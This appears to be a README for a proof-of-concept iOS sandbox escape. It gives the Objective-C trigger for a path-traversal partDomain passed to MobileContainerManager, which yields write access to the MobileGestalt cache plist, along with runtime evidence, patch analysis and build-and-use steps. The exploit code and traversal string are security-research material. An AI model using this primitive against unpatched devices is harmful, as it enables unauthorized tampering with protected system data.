# `geod` MobileContainerManager traversal PoC

This PoC demonstrates two MobileContainerManager defects that compose into one
fixed-directory sandbox escape:

1. Class 12 treats `com.apple.geod` as a built-in allowed system container.
2. MobileContainerManager accepted an unchecked `partDomain` during path
   construction.

This route does not need the `com.apple.mobile.MobileHouseArrest` caller
identity. The old Filza label `[MHA-C12]` described the container class, but it
did not describe the root cause correctly.

## Trigger

The request selects the `geod` system-data container. It asks for part 3,
`Library/Caches`, and a read/write sandbox extension.

```objc
query_set_class(query, 12);
query_set_ids(query, xpc_string_create("com.apple.geod"));
query_set_flags(query, UINT64_C(0x8100000000));
query_set_part(query, 3);
query_set_part_domain(query,
    "../../../../../../containers/Shared/SystemGroup/"
    "systemgroup.com.apple.mobilegestaltcache/Library/Caches");
```

The affected implementation returned this lexical path:

```text
/private/var/containers/Data/System/com.apple.geod/Library/Caches/../../../../../../containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches
```

It resolves to this exact directory:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches
```

The directory contains the live cache plist:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist
```

[`poc.m`](poc.m) activates the returned token and opens that plist with
`O_RDWR | O_NOFOLLOW`. The simple PoC does not change the plist.

## Runtime evidence

A transactional test ran on `iPhone18,2`, iOS 27.0 build `24A5380h`.

- MobileContainerManager returned a 275-byte sandbox token.
- Token activation succeeded.
- The resolved directory matched the MobileGestalt cache directory.
- The test installed the key `CodexMCMGeodWriteProof` with a chosen UUID.
- The test read back the chosen key, value, and serialized bytes.
- The test restored the exact original bytes and inode.
- The final log reported `proof_succeeded=true` and
  `recovery_unresolved=false`.

This proves chosen-content write access to the MobileGestalt cache plist on the
tested build. It does not prove arbitrary `/private/var` access.

## Direct `geod` lookup is weaker

On `iPhone18,2` build `24A5390f`,
`container_system_path_for_identifier("com.apple.geod")` returned:

```text
/private/var/containers/Data/System/com.apple.geod
```

The app listed `Documents`, `Library`, `tmp`, and the container metadata plist.
Opening the metadata plist failed with `EPERM`. This direct result proves
directory enumeration only. It is not the MobileGestalt write primitive.

## Scope and safety

- The proven write authority covers the fixed MobileGestalt cache directory.
- It does not cover all system containers or all of `/private/var`.
- It does not provide root, kernel access, Keychain access, or code execution.
- Do not replace the exact traversal with `..`, `../..`, or broader ancestors.

An older `partDomain=../..` experiment changed two existing class-12 container
roots from owner `0:0` to `501:501`. A sandboxed app could not restore that
metadata. The public PoC therefore performs no directory creation and no file
mutation.

## Patch status

Static analysis shows that the write chain is patched in `iPhone18,2` build
`24A5408d`.

1. Class-12 result-5 authorization now requires `access == 0`.
2. Every supported sandbox-extension request has nonzero access.
3. A second guard rejects the proven part-3 read/write request.
4. Message parsing rejects a `partDomain` that is empty, contains `/`, or starts
   with `.`.

The old `geod` strings can remain in the binary. They do not restore the
read/write extension or traversal primitive.

Runtime denial testing on `24A5408d` would confirm the static result. The exact
target device currently runs `24A5390f`, so this repository does not claim a
`24A5408d` runtime result.

## Use

1. Add `poc.m` to an Objective-C iOS application target.
2. Build with the `iphoneos` SDK for `arm64e`.
3. Call `run_geod_mcm_poc()` from an explicit test action.

No special bundle identifier or private entitlement is required for the tested
route.
